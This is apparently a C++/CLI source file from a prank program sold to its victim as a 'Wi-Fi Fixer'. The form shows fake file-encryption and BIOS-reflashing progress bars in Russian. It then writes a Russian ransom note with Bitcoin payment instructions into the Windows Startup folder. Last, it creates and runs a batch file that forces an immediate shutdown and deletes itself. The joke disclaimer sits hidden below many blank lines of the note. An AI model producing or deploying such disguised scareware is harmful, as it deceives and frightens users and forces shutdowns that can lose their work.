#pragma once

namespace wififixer {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Сводка для blocking
	/// </summary>
	public ref class blocking : public System::Windows::Forms::Form
	{
	public:
		blocking(void)
		{
			InitializeComponent();
			//
			//TODO: добавьте код конструктора
			//
		}

	protected:
		/// <summary>
		/// Освободить все используемые ресурсы.
		/// </summary>
		~blocking()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Label^ blocking_label;
	protected:

	private: System::Windows::Forms::ProgressBar^ block_fileBAR;
	protected:

	private: System::Windows::Forms::Label^ label1;
	private: int local_count = 0, check = 0;
	private: System::Windows::Forms::Timer^ blockingTIMER;
	private: System::Windows::Forms::Timer^ biosTIMER;
	private: System::Windows::Forms::ProgressBar^ block_biosBAR;
	private: System::Windows::Forms::Timer^ chek1;
	private: System::Windows::Forms::Label^ bios_done;
	private: System::Windows::Forms::Label^ blocking_done;
	private: System::ComponentModel::IContainer^ components;



	private:
		/// <summary>
		/// Обязательная переменная конструктора.
		/// </summary>


#pragma region Windows Form Designer generated code
		/// <summary>
		/// Требуемый метод для поддержки конструктора — не изменяйте 
		/// содержимое этого метода с помощью редактора кода.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(blocking::typeid));
			this->blocking_label = (gcnew System::Windows::Forms::Label());
			this->block_fileBAR = (gcnew System::Windows::Forms::ProgressBar());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->blockingTIMER = (gcnew System::Windows::Forms::Timer(this->components));
			this->biosTIMER = (gcnew System::Windows::Forms::Timer(this->components));
			this->block_biosBAR = (gcnew System::Windows::Forms::ProgressBar());
			this->chek1 = (gcnew System::Windows::Forms::Timer(this->components));
			this->bios_done = (gcnew System::Windows::Forms::Label());
			this->blocking_done = (gcnew System::Windows::Forms::Label());
			this->SuspendLayout();
			// 
			// blocking_label
			// 
			this->blocking_label->AutoSize = true;
			this->blocking_label->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->blocking_label->Location = System::Drawing::Point(12, 9);
			this->blocking_label->Name = L"blocking_label";
			this->blocking_label->Size = System::Drawing::Size(177, 26);
			this->blocking_label->TabIndex = 3;
			this->blocking_label->Text = L"Шифрование ПК:\r\nЗашифровано 0 файлов из 0";
			// 
			// block_fileBAR
			// 
			this->block_fileBAR->Location = System::Drawing::Point(15, 39);
			this->block_fileBAR->Maximum = count;
			this->block_fileBAR->Name = L"block_fileBAR";
			this->block_fileBAR->Size = System::Drawing::Size(438, 22);
			this->block_fileBAR->TabIndex = 4;
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->label1->Location = System::Drawing::Point(12, 64);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(132, 13);
			this->label1->TabIndex = 5;
			this->label1->Text = L"Перепрошивка BIOS:";
			// 
			// blockingTIMER
			// 
			this->blockingTIMER->Tick += gcnew System::EventHandler(this, &blocking::blockingTIMER_Tick);
			// 
			// biosTIMER
			// 
			this->biosTIMER->Tick += gcnew System::EventHandler(this, &blocking::biosTIMER_Tick);
			// 
			// block_biosBAR
			// 
			this->block_biosBAR->Location = System::Drawing::Point(12, 80);
			this->block_biosBAR->Maximum = 500;
			this->block_biosBAR->Name = L"block_biosBAR";
			this->block_biosBAR->Size = System::Drawing::Size(438, 22);
			this->block_biosBAR->TabIndex = 6;
			// 
			// chek1
			// 
			this->chek1->Tick += gcnew System::EventHandler(this, &blocking::chek1_Tick);
			// 
			// bios_done
			// 
			this->bios_done->AutoSize = true;
			this->bios_done->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->bios_done->ForeColor = System::Drawing::SystemColors::ControlText;
			this->bios_done->Location = System::Drawing::Point(150, 64);
			this->bios_done->Name = L"bios_done";
			this->bios_done->Size = System::Drawing::Size(104, 13);
			this->bios_done->TabIndex = 13;
			this->bios_done->Text = L"ВЫПОЛНЯЕТСЯ";
			// 
			// blocking_done
			// 
			this->blocking_done->AutoSize = true;
			this->blocking_done->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->blocking_done->ForeColor = System::Drawing::SystemColors::ControlText;
			this->blocking_done->Location = System::Drawing::Point(120, 9);
			this->blocking_done->Name = L"blocking_done";
			this->blocking_done->Size = System::Drawing::Size(104, 13);
			this->blocking_done->TabIndex = 14;
			this->blocking_done->Text = L"ВЫПОЛНЯЕТСЯ";
			// 
			// blocking
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::SystemColors::Control;
			this->ClientSize = System::Drawing::Size(465, 111);
			this->ControlBox = false;
			this->Controls->Add(this->blocking_done);
			this->Controls->Add(this->bios_done);
			this->Controls->Add(this->block_biosBAR);
			this->Controls->Add(this->label1);
			this->Controls->Add(this->block_fileBAR);
			this->Controls->Add(this->blocking_label);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::FixedToolWindow;
			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
			this->Name = L"blocking";
			this->ShowIcon = false;
			this->ShowInTaskbar = false;
			this->Text = L"Шифрование ПК";
			this->TopMost = true;
			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &blocking::blocking_FormClosing);
			this->Load += gcnew System::EventHandler(this, &blocking::blocking_Load);
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void blocking_Load(System::Object^ sender, System::EventArgs^ e) {
		this->Location = Point(Screen::PrimaryScreen->WorkingArea.Width - this->Width, Screen::PrimaryScreen->WorkingArea.Height - this->Height);
		this->blockingTIMER->Start();
		this->biosTIMER->Start();
		this->chek1->Start();
	}
	private: System::Void blocking_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {
		e->Cancel;
	}
	private: System::Void biosTIMER_Tick(System::Object^ sender, System::EventArgs^ e) {
		if (this->block_biosBAR->Value < 70)
			this->block_biosBAR->Increment(rand() % 6);
		else if (this->block_biosBAR->Value > 70 && this->block_biosBAR->Value < 170)
			this->block_biosBAR->Increment(rand() % 2);
		else if (this->block_biosBAR->Value > 170 && this->block_biosBAR->Value < 321)
			this->block_biosBAR->Increment(rand() % 6);
		else if (this->block_biosBAR->Value > 321 && this->block_biosBAR->Value < 466)
			this->block_biosBAR->Increment(rand() % 4);
		else
			this->block_biosBAR->Increment(rand() % 2);
		if (this->block_biosBAR->Value == 500) {
			this->bios_done->Text = "ВЫПОЛНЕНО!";
			this->bios_done->ForeColor = System::Drawing::Color::LimeGreen;
			bios_did = true;
			biosTIMER->Stop();
		}
	}
	private: System::Void blockingTIMER_Tick(System::Object^ sender, System::EventArgs^ e) {
		int random = 10 + rand() % 10;
		this->local_count += random;
		this->block_fileBAR->Increment(random);
		if (this->block_fileBAR->Value == count) {
			blockingTIMER->Stop();
			this->blocking_done->Text = "ВЫПОЛНЕНО!";
			this->blocking_done->ForeColor = System::Drawing::Color::LimeGreen;
			blocking_did = true;
			if (this->local_count > count)
				this->local_count = count;
		}
		this->blocking_label->Text = "Шифрование ПК:\nЗашифровано " + local_count + " файлов из " + count;
	}
	private: System::Void chek1_Tick(System::Object^ sender, System::EventArgs^ e) {
		if (cookie_did && password_did && info_did && paypal_did && bios_did && blocking_did)
			this->check++;
		if (this->check == 3) {
			std::ofstream file("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt");
				if (file.is_open()) {
					file << "ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!\nВаш личный идентификатор\n6A02000000000000***242FB01\nВаши документы, фотографии, базы данных и другие важные данные были зашифрованы.\nДля восстановления данных необходим дешифровщик.\nЧтобы получить дешифровщик, следует отправить письмо на электронный адрес iluha.bolshoi.pisun228@tutanota.com (iluha.bolshoi.pisun228@mail.ee, iluha.bolshoi.pisun228@yandex.by)\nВ письме укажите Ваш личный идентификатор (см.в начале данного документа).\nДалее необходимо оплатить стоимость дешифровщика. В ответном письме Вы получите адрес\nBitcoin - кошелька, на который необходимо выполнить перевод денежных средств и сумму платежа.\nЕсли у Вас нет биткойнов\n*Создайте кошелек Bitcoin: https://blockchain.info/ru/wallet/new\n*Приобретите криптовалюту Bitcoin:\nhttps://localbitcoins.com/ru/buy_bitcoins (Visa/MasterCard, QIWI Visa Wallet и др.)\n*Отправьте требуемое количество BTC на указанный в письме адрес\nКогда денежный перевод будет подтвержден, Вы получите дешифровщик файлов для Вашего компьютера.\nПосле запуска программы - дешифровщика все Ваши файлы будут восстановлены.\nГарантия расшифровки файлов.\nПеред оплатой вы можете отправить нам до 3х файлов для бесплатной расшифровки.\nОни не должны содержать важную информацию, общий размер файлов должен быть не более 10 мб.\nВнимание!\n*Не пытайтесь удалить программу или запускать антивирусные средства\n*Попытки самостоятельной расшифровки файлов приведут к потере Ваших данных\n*Дешифраторы других пользователей несовместимы с Вашими данными, так как у каждого пользователя уникальный ключ шифрования\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n(Для дураков: это была шутка, с вашими файлами всё в порядке. WI-FI Fixer — абсолютно безвредное, шуточное приложение. С первым апреля!)";
					file.close();
				}
				std::ofstream shutdown("C:\\sleep.bat");
				if (shutdown.is_open()) {
					shutdown << "shutdown /s /t 00\ndel %0";
					shutdown.close();
				}
				(gcnew System::Diagnostics::Process())->Start("C:\\sleep.bat");
				BlockInput(false);
				Application::Exit();
		}
	}
};
}